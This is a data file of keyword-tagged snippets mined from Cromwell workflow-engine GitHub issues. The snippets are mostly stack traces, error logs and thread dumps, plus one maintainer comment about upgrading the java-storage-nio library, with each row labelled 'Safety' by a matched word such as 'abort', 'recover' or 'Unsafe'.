cromwell.core.retry.Retry$.withRetry(Ret,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7495:3185,recover,recoverAsync,3185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7495,1,['recover'],['recoverAsync']
Safety,"-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(ab42cf3c)]: Call-to-Backend assignments: wf_hello.hello -> AWSBATCH; 2018-06-11 16:10:36,997 cromwell-system-akka.dispatchers.engine-dispatcher-36 INFO - WorkflowExecutionActor-ab42cf3c-726f-4148-a30f-0f907c843361 [UUID(ab42cf3c)]: Starting wf_hello.hello; 2018-06-11 16:10:37,958 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - Failed copying cache results for job BackendJobDescriptorKey_CommandCallNode_wf_hello.hello:-1:1, invalidating cache entry.; cromwell.core.CromwellFatalException: software.amazon.awssdk.services.s3.model.NoSuchKeyException: The specified key does not exist. (Service: S3Client; Status Code: 404; Request ID: 289B06CE5822B3C0); 	at cromwell.core.CromwellFatalException$.apply(core.scala:18); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:37); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akk",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3760:2185,recover,recoverWith,2185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3760,1,['recover'],['recoverWith']
Safety,"-system-akka.dispatchers.engine-dispatcher-28 INFO - CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; 2019-07-21 23:34:38,667 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; 2019-07-21 23:34:39,131 cromwell-system-akka.dispatchers.backend-dispatcher-36 INFO - Running with 3 PAPI request workers; 2019-07-21 23:34:39,132 cromwell-system-akka.dispatchers.backend-dispatcher-36 INFO - PAPI request worker batch interval is 33333 milliseconds; 2019-07-21 23:34:39,157 cromwell-system-akka.dispatchers.backend-dispatcher-37 INFO - PAPI request worker batch interval is 33333 milliseconds; 2019-07-21 23:34:39,233 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PAPI request worker batch interval is 33333 milliseconds; ```. but then it immediately starts printing these errors:; ```; 2019-07-21 23:34:40,010 cromwell-system-akka.actor.default-dispatcher-32 ERROR - Error searching for abort requests; java.sql.SQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '""WORKFLOW_STORE_ENTRY"" where (""WORKFLOW_STATE"" = cast('Aborting' as varchar(1677' at line 1; 	at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:120); 	at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:97); 	at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:122); 	at com.mysql.cj.jdbc.ClientPreparedStatement.executeInternal(ClientPreparedStatement.java:970); 	at com.mysql.cj.jdbc.ClientPreparedStatement.execute(ClientPreparedStatement.java:387); 	at com.zaxxer.hikari.pool.ProxyPreparedStatement.execute(ProxyPreparedStatement.java:44); 	at com.zaxxer.hikari.pool.HikariProxyPreparedStatement.execute(HikariProxyPreparedStatement.java); 	at slick.jdbc.StatementInvoker.results(StatementInvoker.scala:38",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5084:3703,abort,abort,3703,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5084,1,['abort'],['abort']
Safety,". In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.18)) that raises my eyebrows a little. It's _probably_ fine, but there is new usage of `StorageOptionsUtil.getDefaultInstance()` for which I don't know the lifecycle or how else it's used. This is the type of thing that I'd watch out for in terms of thread safety, which is the root of the problem that caused us to rollback before. In summary, it's probably safe to go all the way to the most recent version. In fact, my gut feeling is that the risk is low enough to be outweighed by the benefit of being up-to-date.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:2370,safe,safety,2370,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452,3,"['risk', 'safe']","['risk', 'safe', 'safety']"
Safety,.HandleResponseStage.handleErrorResponse(HandleResponseStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.handleResponse(HandleResponseStage.java:73); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:58); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:41); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:63); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:36); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:77); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:39); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.doExecute(RetryableStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.execute(RetryableStage.java:88); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:64); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:44); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execute(StreamManagingStage.java:51); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execute(StreamManagingStage.java:33); 	a,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:1417,Timeout,TimeoutExceptionHandlingStage,1417,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,2,['Timeout'],['TimeoutExceptionHandlingStage']
Safety,".client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ^C[2016-10-27 13:10:13,93] [info] WorkflowManagerActor: Received shutdown signal.; [2016-10-27 13:10:13,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:13,93] [info] WorkflowManagerActor Aborting all workflows; [2016-10-27 13:10:14,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:15,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:16,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:17,93] [info] Waiting for 1 workflows to abort...; ^C^C[2016-10-27 13:10:18,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:19,33] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.n",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:5233,Abort,Aborting,5233,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,2,"['Abort', 'abort']","['Aborting', 'abort']"
Safety,.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:628); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:627); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.execute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:653); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recoverAsync(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:949); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:944); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.executeOrRecover(AwsBatchAsyn,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:6223,recover,recover,6223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,1,['recover'],['recover']
Safety,".scala:49); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2019-01-07 16:21:23,91] [info] WorkflowManagerActor WorkflowActor-18de8166-5f29-4288-9fa4-6741565446fd is in a terminal state: WorkflowFailedState; [2019-01-07 16:21:30,36] [info] SingleWorkflowRunnerActor workflow finished with status 'Failed'.; [2019-01-07 16:21:32,96] [info] Workflow polling stopped; [2019-01-07 16:21:32,99] [info] Shutting down WorkflowStoreActor - Timeout = 5 seconds; [2019-01-07 16:21:32,99] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2019-01-07 16:21:33,02] [info] Aborting all running workflows.; [2019-01-07 16:21:33,03] [info] WorkflowStoreActor stopped; [2019-01-07 16:21:33,03] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2019-01-07 16:21:33,05] [info] JobExecutionTokenDispenser stopped; [2019-01-07 16:21:33,05] [info] WorkflowLogCopyRouter stopped; [2019-01-07 16:21:33,05] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2019-01-07 16:21:33,05] [info] WorkflowManagerActor All workflows finished; [2019-01-07 16:21:33,05] [info] WorkflowManagerActor stopped; [2019-01-07 16:21:33,05] [info] Connection pools shut down; [2019-01-07 16:21:33,07] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2019-01-07 16:21:33,07] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2019-01-07 16:21:33,08] [info] Shutting down CallCacheWriteActor - Timeout = 1800 secon",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4526:7110,Timeout,Timeout,7110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4526,3,"['Abort', 'Timeout']","['Aborting', 'Timeout']"
Safety,.trim() Docker image names to avoid pathological re behavior [BA-6478],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5548:30,avoid,avoid,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5548,1,['avoid'],['avoid']
Safety,".util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-5"" #44 daemon prio=5 os_prio=31 tid=0x00007fb76b517800 nid=0x3b0b waiting on condition [0x0000000131195000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-2"" #43 prio=5 os_prio=31 tid=0x00007fb76e8ee000 nid=0x3f0b waiting on condition [0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:33480,Unsafe,Unsafe,33480,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,".util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-6"" #45 daemon prio=5 os_prio=31 tid=0x00007fb76e8dd000 nid=0x5507 waiting on condition [0x0000000131298000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-5"" #44 daemon prio=5 os_prio=31 tid=0x00007fb76b517800 nid=0x3b0b waiting on condition [0x000",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:32405,Unsafe,Unsafe,32405,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,".util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-7"" #46 daemon prio=5 os_prio=31 tid=0x00007fb76e8f5000 nid=0x5807 waiting on condition [0x000000013139b000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-6"" #45 daemon prio=5 os_prio=31 tid=0x00007fb76e8dd000 nid=0x5507 waiting on condition [0x000",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:31330,Unsafe,Unsafe,31330,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,".util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-8"" #47 daemon prio=5 os_prio=31 tid=0x00007fb76b518000 nid=0x8703 waiting on condition [0x000000013149e000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-7"" #46 daemon prio=5 os_prio=31 tid=0x00007fb76e8f5000 nid=0x5807 waiting on condition [0x000",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:30255,Unsafe,Unsafe,30255,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,".util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-9"" #48 daemon prio=5 os_prio=31 tid=0x00007fb76b529800 nid=0x8903 waiting on condition [0x00000001315a1000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-8"" #47 daemon prio=5 os_prio=31 tid=0x00007fb76b518000 nid=0x8703 waiting on condition [0x000",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:29180,Unsafe,Unsafe,29180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"/a67833cb-b894-4790-872f-9f3104cab60c/call-illumina_demux/illumina_demux-stdout.log; 2018-06-13 14:41:14,088 cromwell-system-akka.dispatchers.backend-dispatcher-112 INFO - AwsBatchAsyncBackendJobExecutionActor [UUID(a67833cb)demux_only.illumina_demux:NA:1]: Status change from Running to Succeeded; 2018-06-13 14:41:15,905 cromwell-system-akka.dispatchers.engine-dispatcher-37 ERROR - WorkflowManagerActor Workflow a67833cb-b894-4790-872f-9f3104cab60c failed (during ExecutingWorkflowState): cromwell.core.CromwellFatalException: java.nio.file.NoSuchFileException: target not exists: s3://s3.amazonaws.com/atbiofx-cromwell/cromwell-execution/demux_only/a67833cb-b894-4790-872f-9f3104cab60c/call-illumina_demux/illumina_demux-rc.txt; 	at cromwell.core.CromwellFatalException$.apply(core.scala:18); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:37); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at 